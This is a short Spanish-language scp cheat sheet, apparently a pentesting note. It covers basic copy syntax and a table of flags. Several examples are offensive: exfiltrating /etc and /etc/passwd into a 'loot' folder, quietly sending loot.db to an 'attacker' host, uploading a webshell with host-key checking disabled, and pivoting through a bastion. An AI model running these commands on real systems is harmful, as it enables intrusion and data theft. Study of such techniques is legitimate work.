Local → Remoto 
```
scp archivo_local usuario@host:/ruta/destino/
```

Remoto → Local 
```
scp usuario@host:/ruta/archivo_remoto ./destino_local/
```

```
sudo systemctl start ssh ## PARA ESCUCHAR SSH POR EL P 22
```

Remoto → Remoto 
```
scp usuario1@host1:/origen usuario2@host2:/destino/
```

| Parámetro | Función                                                              | Ejemplo de sintaxis                              |
| --------- | -------------------------------------------------------------------- | ------------------------------------------------ |
| `-P`      | Especifica puerto SSH distinto de 22                                 | `scp -P 2222 file user@host:/tmp/`               |
| `-p`      | Preserva fechas, permisos y modos                                    | `scp -p user@host:/etc/passwd ./`                |
| `-r`      | Copia recursiva (directorios)                                        | `scp -r user@host:/var/www/ ./backup/`           |
| `-C`      | Activa compresión (más rápido en conexiones lentas)                  | `scp -C bigfile.tar.gz user@host:/tmp/`          |
| `-i`      | Usa clave privada específica                                         | `scp -i ~/.ssh/id_ed25519 file user@host:/tmp/`  |
| `-c`      | Fuerza cifrado específico (útil en servidores antiguos)              | `scp -c aes128-ctr file user@host:/tmp/`         |
| `-o`      | Opciones SSH adicionales (ProxyJump, StrictHostKeyChecking=no, etc.) | `scp -o "ProxyJump bastion" file internal:/tmp/` |
| `-q`      | Modo silencioso (sin barra de progreso)                              | `scp -q loot.db attacker@1.1.1.1:~/`             |
| `-B`      | Modo batch (no pide contraseñas ni confirmaciones)                   | `scp -B file user@host:/tmp/`                    |
| `-v`      | Verbose (útil para debug)                                            | `scp -v user@host:/root/.bash_history ./`        |

```
# Exfiltrar /etc rápidamente
scp -r root@10.10.10.50:/etc ./loot/

# Subir webshell sin preguntas
scp -i id_rsa -o StrictHostKeyChecking=no shell.php user@target:/var/www/html/

# Pivoting a través de bastion
scp -o "ProxyJump user@bastion" loot.db user@internal:/tmp/
```